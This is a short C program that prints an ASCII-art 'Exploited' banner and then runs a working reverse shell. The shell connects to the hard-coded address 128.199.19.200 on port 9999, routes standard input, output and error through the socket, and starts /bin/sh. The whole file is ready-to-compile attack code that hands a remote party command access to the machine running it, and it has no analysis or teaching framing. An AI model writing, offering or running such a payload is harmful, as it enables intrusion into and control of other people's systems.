#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pty.h>
#include <signal.h>

// ASCII Art Display Function
void display_ascii_art() {
    const char *art = 
    "  ______                  _           _   _                _   \n"
    " |  ____|                | |         (_) | |              | |  \n"
    " | |__    __  __  _ __   | |   ___    _  | |_    ___    __| |  \n"
    " |  __|   \\ \\/ / | '_ \\  | |  / _ \\  | | | __|  / _ \\  / _` |  \n"
    " | |____   >  <  | |_) | | | | (_) | | | | |_  |  __/ | (_| |  \n"
    " |______| /_/\\_\\ | .__/  |_|  \\___/  |_|  \\__|  \\___|  \\__,_|  \n"
    "                 | |                                            \n"
    "                 |_|                                            \n";

    printf("%s", art);
    fflush(stdout);
}

// Reverse Shell Setup Function
void reverse_shell() {
    const char *RHOST = "128.199.19.200";  // Replace with the attacker's IP
    const int RPORT = 9999;             // Replace with the desired port

    int sock;
    struct sockaddr_in server;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Could not create socket");
        exit(1);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(RPORT);
    server.sin_addr.s_addr = inet_addr(RHOST);

    // Connect to the remote host
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connect failed");
        exit(1);
    }

    // Redirect input/output
    dup2(sock, 0);  // stdin
    dup2(sock, 1);  // stdout
    dup2(sock, 2);  // stderr

    // Spawn a shell
    char *const args[] = {"/bin/sh", NULL};
    execvp(args[0], args);

    // Cleanup
    close(sock);
}

int main() {
    display_ascii_art();
    reverse_shell();
    return 0;
}

